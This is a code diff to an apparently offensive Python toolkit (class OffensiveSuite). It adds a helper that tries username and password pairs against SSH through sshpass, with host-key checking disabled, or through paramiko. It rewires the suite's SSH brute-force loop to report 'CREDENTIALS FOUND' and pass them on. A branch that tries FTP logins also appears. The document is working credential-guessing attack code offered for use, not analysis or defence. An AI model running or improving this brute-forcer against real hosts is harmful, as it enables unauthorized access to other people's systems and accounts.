@@ -11,12 +11,35 @@ import shutil
 import signal
 import json
 import hashlib
-try:
-    import paramiko
-    HAS_PARAMIKO = True
-except ImportError:
-    paramiko = None
-    HAS_PARAMIKO = False
+import subprocess
+import os
+
+def _ssh_auth(host, user, password, timeout=5):
+    """Try SSH auth via sshpass if available, fallback to pexpect or paramiko."""
+    # Try sshpass first (Termux: pkg install sshpass openssh)
+    sshpass = shutil.which("sshpass")
+    if sshpass:
+        try:
+            r = subprocess.run(
+                [sshpass, "-p", password, "ssh", "-o", "StrictHostKeyChecking=no",
+                 "-o", "ConnectTimeout=" + str(timeout), f"{user}@{host}", "exit 0"],
+                capture_output=True, timeout=timeout + 2
+            )
+            return r.returncode == 0
+        except (subprocess.TimeoutExpired, OSError):
+            pass
+    # Fallback: try paramiko if installed
+    try:
+        import paramiko
+        c = paramiko.SSHClient()
+        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        c.connect(host, username=user, password=password, timeout=timeout)
+        c.close()
+        return True
+    except ImportError:
+        return False
+    except Exception:
+        return False
 import ftplib
 import termios
 import tty
@@ -254,17 +277,11 @@ class OffensiveSuite:
                     if self.stop_event.is_set(): return
                     try:
                         if s.lower() == "ssh":
-                            if not HAS_PARAMIKO:
-                                self.ui.add_log(f"SSH bruteforce unavailable: install 'python-paramiko' via pkg (Termux) or 'paramiko' via pip", "ERROR")
+                            if _ssh_auth(t, user, pwd):
+                                self.ui.add_log(f"CREDENTIALS FOUND: {user}:{pwd}", "CRITICAL")
+                                self.cortex.trigger_feedback(f"SSH credentials discovered: {user}:{pwd} on {t}")
+                                found = True
                                 break
-                            c = paramiko.SSHClient()
-                            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                            c.connect(t, username=user, password=pwd, timeout=5)
-                            self.ui.add_log(f"CREDENTIALS FOUND: {user}:{pwd}", "CRITICAL")
-                            self.cortex.trigger_feedback(f"SSH credentials discovered: {user}:{pwd} on {t}")
-                            found = True
-                            c.close()
-                            break
                         elif s.lower() == "ftp":
                             f = ftplib.FTP(t)
                             f.login(user, pwd)
